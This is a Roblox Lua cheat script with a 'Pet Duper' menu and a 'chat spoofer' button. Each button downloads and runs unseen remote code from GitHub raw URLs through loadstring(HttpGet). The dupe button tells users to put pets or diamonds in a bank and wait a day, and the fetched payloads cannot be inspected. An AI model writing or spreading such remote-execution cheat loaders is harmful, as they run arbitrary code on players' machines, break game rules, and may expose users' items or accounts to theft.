local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
local Window = Library.CreateLib("Pet Duper", "Ocean")
--tabs
local DupeTab = Window:NewTab("Duping")

local OTab = Window:NewTab("Other")

--sections
local DSection = DupeTab:NewSection("SCRIPT BY RBLXSCRIPTS")
local OSection = OTab:NewSection("SCRIPT BY RBLXSCRIPTS")
--labels
DSection:NewLabel("Can only dupe exclusive huges diamonds")
--buttons
DSection:NewButton("Dupe", "Put your pet or diamonds in bank and wait 1 day", function()
    _G.License = "641899b1347e793d2002"
loadstring(game:HttpGet("https://raw.githubusercontent.com/psx-Scripts/psxsc/main/script.lua"))()
end)

OSection:NewButton("chat spoofer", "SpoofChat", function()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/ant-7802/--/main/straightmilk.lua'))()
end)